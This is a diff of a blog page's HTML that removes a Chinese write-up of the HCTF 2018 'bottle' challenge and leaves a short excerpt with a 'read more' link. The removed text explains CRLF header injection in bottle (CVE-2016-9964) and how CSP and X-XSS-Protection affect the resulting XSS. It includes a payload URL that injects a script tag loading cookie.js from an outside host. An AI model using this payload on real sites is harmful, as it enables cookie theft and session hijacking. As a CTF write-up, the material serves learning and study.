@@ -376,16 +376,14 @@
 
       
         
-          
-            <p>一个CLRF头注入的题目，很有意思，也看了很多别人的解法，这里写一下自己的想法。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
-<p>hint1: <em>/3 </em>/10<br>hint2: firfoxdriver</p>
-</blockquote>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="解题尝试"><a href="#解题尝试" class="headerlink" title="解题尝试"></a>解题尝试</h3><p>bottle是一个python模块，出现过头注入的漏洞CVE-2016-9964，具体参考p师傅的文章<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a>。发现这个题目在登陆成功之后有一个303的跳转，redirect会在Headers中加入<code>Location: url</code>，可能出现CLRF注入<br><img src="HCTF-2018-bottle-Writeup/2-1.png" alt=""><br><img src="HCTF-2018-bottle-Writeup/2-2.png" alt=""><br>因为Location并不为空，所以浏览器会自动跳转，但是当跳转url的端口号小于80就不会跳转，我们使用<code>http://http://39.107.124.151:1000/path?path=http://127.0.0.1:0/%0D%0A%0D%0A%3Cscript+src=http://donky.top/js/cookie.js%3E%3C/script%3E</code>查看<br><img src="HCTF-2018-bottle-Writeup/2-3.png" alt=""><br><code>%0D%0A%0D%0A</code>之后成功注入script标签，而且的script标签后的header也变成了body。hint为firefoxdriver，我们在Firefox中测试。<br><img src="HCTF-2018-bottle-Writeup/2-4.png" alt=""><br>外部js被CSP阻拦了。队友@srpopty一开始准备注入<code>Content-Security-Policy: default-src *</code>来覆盖原来header的CSP，可是CSP是按照最严格的实施的。</p>
-<h3 id="关于X-XSS-Protection"><a href="#关于X-XSS-Protection" class="headerlink" title="关于X-XSS-Protection"></a>关于X-XSS-Protection</h3><p>赛后看来很多的WP，发现有很多使用<code>X-XSS-Protection: 0</code>，查看文档<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank" rel="noopener">X-XSS-Protection</a><br><img src="HCTF-2018-bottle-Writeup/2-5.png" alt=""><br>可以看到这个header只支持IE，Chrome，Safari，并不支持Firefox，再看一下语法<br><img src="HCTF-2018-bottle-Writeup/2-6.png" alt=""><br>接着我在Chrome中测试<br><img src="HCTF-2018-bottle-Writeup/2-7.png" alt="">同时设置<code>CSP</code>和<code>X-XSS-Protection: 0</code>时，CSP还是生效了<br><img src="HCTF-2018-bottle-Writeup/2-8.png" alt=""><br>当不设置CSP时，我们执行简单的<code>alert(1)</code>时<br><img src="HCTF-2018-bottle-Writeup/2-9.png" alt=""><br>发现弹窗成功，<strong>X-XSS-Protection:0只可以把浏览器自带的XSS Filtter杀掉，并不能够kill CSP</strong></p>
-<h3 id="正确解法"><a href="#正确解法" class="headerlink" title="正确解法"></a>正确解法</h3><p>其实按照出题人意图，bottle每次启动会将header随机排列，根据hint提示隔段时间就认为地将CSP放到Location下面，然而我在第一天试了很多次都没有这种情况。可能出题人并没有设置好，第二天直接将CSP放到Location下了，这样就可以直接XSS了。。。</p>
-
-          
+          <p>一个CLRF头注入的题目，很有意思，也看了很多别人的解法，这里写一下自己的想法。
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/15/HCTF-2018-bottle-Writeup/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
